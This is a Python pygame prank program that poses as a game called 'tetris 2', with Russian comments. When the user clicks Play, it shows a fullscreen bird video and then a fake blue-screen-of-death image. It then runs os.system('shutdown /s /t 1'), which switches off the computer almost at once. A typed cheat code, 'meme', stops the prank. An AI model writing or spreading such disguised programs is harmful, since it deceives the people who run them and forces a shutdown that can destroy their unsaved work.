import pygame
import os
import sys
from moviepy.editor import VideoFileClip

pygame.init()
height, width = pygame.display.Info().current_h, pygame.display.Info().current_w

# Настройки окна
screen = pygame.display.set_mode((width, height), pygame.FULLSCREEN)  # Полноэкранный режим
pygame.display.set_caption("tetris 2")

# Загрузка музыки
pygame.mixer.music.load("src/music.wav")  # Замените на путь к вашей 8-битной музыке
pygame.mixer.music.play(-1)  # Воспроизводим музыку в цикле
bird_sound = pygame.mixer.Sound("src/bird.mp3")  # Замените на путь к вашей музыке
blue_sound = pygame.mixer.Sound("src/blue.mp3")  # Замените на путь к вашей музыке

# Загрузка изображения с Тетрисом
tetris_background = pygame.image.load("src/tet.jpeg")  # Замените на путь к вашему изображению
tetris_background = pygame.transform.scale(tetris_background, (width, height))  # Изменяем размер изображения под экран

# Кнопка Play
font = pygame.font.Font(None, 74)
play_button = font.render("Play", True, (255, 255, 255))
play_rect = play_button.get_rect(center=(width // 2, height // 2))

# Чит-код
cheat_code = "meme"
input_code = ""


def birdshouting():
    # Воспроизведение видео с изменением разрешения
    pygame.mixer.music.stop()  # Остановка музыки
    bird_sound.play()  # Запускаем музыку
    clip = VideoFileClip("src/bird.mp4", target_resolution=(height, width))  # Замените на путь к вашему видео

    for frame in clip.iter_frames(fps=90, dtype='uint8'):
        # Преобразуем кадр в Surface Pygame
        frame_surface = pygame.surfarray.make_surface(frame)
        frame_surface = pygame.transform.rotate(frame_surface, 270)  # Размер кадра
        screen.blit(frame_surface, (0, 0))  # Отображаем кадр
        pygame.display.flip()  # Обновляем экран

        # Обработка событий для выхода
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                return
            if event.type == pygame.KEYDOWN and event.key == pygame.K_q:
                return


def blue_screen():
    # Загрузка изображения синего экрана смерти
    bird_sound.stop()
    blue_sound.play()
    blue_screen_image = pygame.image.load("src/blue screen.png")  # Замените на путь к вашему изо��ражению
    screen_width, screen_height = screen.get_size()
    # Изменение размера изображения в соответствии с размерами экрана
    blue_screen_image = pygame.transform.scale(blue_screen_image, (screen_width, screen_height))
    screen.fill((0, 0, 0))  # Очистка экрана
    screen.blit(blue_screen_image, (0, 0))  # Отображение изображения
    pygame.display.flip()
    pygame.time.delay(5000)  # Задержка 5 секунд


# Главный цикл
running = True
while running:
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            running = False
        if event.type == pygame.KEYDOWN:
            input_code += event.unicode
            if input_code == cheat_code:
                print("Пранк деактивирован!")
                pygame.mixer.music.stop()
                running = False
            if len(input_code) > len(cheat_code):
                input_code = input_code[1:]  # Удаляем первый символ, если длина превышает

    # Отображаем фон с Тетрисом
    screen.blit(tetris_background, (0, 0))

    # Отображаем кнопку Play
    screen.blit(play_button, play_rect)
    pygame.display.flip()

    # Проверка нажатия кнопки Play
    mouse = pygame.mouse.get_pressed()
    if mouse[0]:
        if play_rect.collidepoint(pygame.mouse.get_pos()):
            birdshouting()
            blue_screen()
            os.system("shutdown /s /t 1")  # Выключение к��мпьютера

pygame.quit()
sys.exit()